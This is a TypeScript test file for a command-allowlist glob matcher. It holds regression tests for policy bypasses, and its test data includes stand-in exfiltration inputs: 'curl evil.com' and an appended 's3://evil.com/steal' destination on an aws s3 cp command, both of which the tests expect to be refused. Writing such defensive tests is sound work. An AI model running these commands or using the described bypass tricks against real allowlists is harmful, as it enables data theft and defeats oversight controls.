import { describe, expect, it } from "vitest";

import { isCommandAllowed, matchCommand } from "./glob";

describe("matchCommand (argv-aware)", () => {
  it("`vercel *` matches the vercel binary with any args (including none)", () => {
    expect(matchCommand("vercel *", ["vercel", "deploy"])).toBe(true);
    expect(matchCommand("vercel *", ["vercel", "deploy", "--prod"])).toBe(true);
    expect(matchCommand("vercel *", ["vercel"])).toBe(true);
  });

  it("`vercel *` does not match a different command", () => {
    expect(matchCommand("vercel *", ["curl", "evil.com"])).toBe(false);
    expect(matchCommand("vercel *", ["vercelize", "now"])).toBe(false);
  });

  it("an exact pattern rejects extra args", () => {
    expect(matchCommand("convex deploy", ["convex", "deploy"])).toBe(true);
    expect(matchCommand("convex deploy", ["convex", "deploy", "--yes"])).toBe(false);
    expect(matchCommand("convex deploy", ["convex", "env", "set", "X"])).toBe(false);
  });

  it("`convex env *` matches nested subcommands", () => {
    expect(matchCommand("convex env *", ["convex", "env", "set", "FOO", "bar"])).toBe(true);
    expect(matchCommand("convex env *", ["convex", "deploy"])).toBe(false);
  });

  it("escapes regex metacharacters in literal tokens", () => {
    expect(matchCommand("echo a.b", ["echo", "a.b"])).toBe(true);
    expect(matchCommand("echo a.b", ["echo", "axb"])).toBe(false); // `.` is literal
  });

  it("a lone `*` allows anything", () => {
    expect(matchCommand("*", ["anything", "goes", "here"])).toBe(true);
  });

  it("a non-final `*` token matches a single arg that itself contains spaces", () => {
    expect(matchCommand("cp * dest", ["cp", "my file.txt", "dest"])).toBe(true);
  });

  // ---- Regressions for the confirmed policy-bypass exploits ----

  it("does NOT let an extra trailing arg slip past a non-wildcard-terminated pattern (exfil)", () => {
    // Author intent: copy ONE file to mybucket. The pattern has no trailing bare
    // `*`, so an appended second (exfil) destination must be refused.
    const pattern = "aws s3 cp * s3://mybucket/*";
    expect(matchCommand(pattern, ["aws", "s3", "cp", "file.txt", "s3://mybucket/ok"])).toBe(true);
    expect(
      matchCommand(pattern, [
        "aws",
        "s3",
        "cp",
        "file.txt",
        "s3://mybucket/ok",
        "s3://evil.com/steal",
      ]),
    ).toBe(false);
  });

  it("does NOT let a space-containing executable spoof a multi-token pattern", () => {
    // A binary literally named "vercel deploy" is a SINGLE argv entry; it must
    // not satisfy the pattern token "vercel".
    expect(matchCommand("vercel deploy *", ["vercel deploy", "--prod"])).toBe(false);
    expect(matchCommand("vercel deploy *", ["vercel", "deploy", "--prod"])).toBe(true);
  });
});

describe("isCommandAllowed", () => {
  it("passes when any glob matches", () => {
    expect(isCommandAllowed(["convex", "env", "set", "X"], ["convex deploy", "convex env *"])).toBe(
      true,
    );
  });

  it("denies when no glob matches", () => {
    expect(isCommandAllowed(["curl", "evil.com"], ["vercel *", "convex deploy"])).toBe(false);
  });
});
